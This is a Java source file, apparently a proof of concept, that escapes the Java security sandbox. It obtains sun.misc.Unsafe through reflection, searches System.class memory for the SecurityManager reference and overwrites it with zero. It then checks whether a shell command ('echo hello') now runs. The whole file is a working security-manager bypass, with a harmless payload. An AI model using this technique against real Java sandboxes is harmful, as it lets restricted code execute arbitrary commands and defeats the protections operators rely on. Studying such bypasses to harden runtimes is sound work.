import java.util.*;
import java.io.*;
import sun.misc.*;
import java.lang.reflect.*;
import java.security.*;

public class SmartCard
{
    static Unsafe unsafe;

    public static void main(String[] args) throws Exception
    {
        testCmd("echo", "hello");

        Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafe.setAccessible(true);
        unsafe = (Unsafe) theUnsafe.get(null);

        long sm = getAddress(System.getSecurityManager());
        System.out.printf("SecurityManager: %016x\n", sm);

        long sys = getAddress(System.class);
        System.out.printf("System.class: %x\n", sys);
        long smIndex = 0;
        for(; smIndex < 100; smIndex++) {
            int tmp = unsafe.getInt(sys+smIndex*4);
            long tmp2 = tmp & 0xffffffffL;
            System.out.printf("System.class[%d]: (%08x == %08x) is %b\n", smIndex, tmp2, sm, tmp2 == sm);
            
            if(tmp2 == sm) {
                System.out.printf("Found SM\n");
                break;
            }
        }
        unsafe.putInt(sys+smIndex*4, 0);
        System.out.printf("SecurityManager: %016x\n", getAddress(System.getSecurityManager()));
        testCmd("echo", "hello");
    }

    private static void testCmd(String... cmd)
    {
        String str = Arrays.toString(cmd).replaceAll("[\\[,\\]]", "");
        System.out.print("Trying to execute command {" + str + "} ... ");
        try
        {
            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.inheritIO();
            pb.start().waitFor();
        }
        catch (Exception e)
        {
            System.out.println("Nope");
            return;
        }
        System.out.println("COMMAND EXECUTED SUCCESSFULLY");
    }
    
    static long getAddress(Object obj)
    {
        Object[] array = new Object[]
        {
                obj
        };
        long baseOffset = unsafe.arrayBaseOffset(Object[].class);
        return unsafe.getLong(array, baseOffset);
    }
}
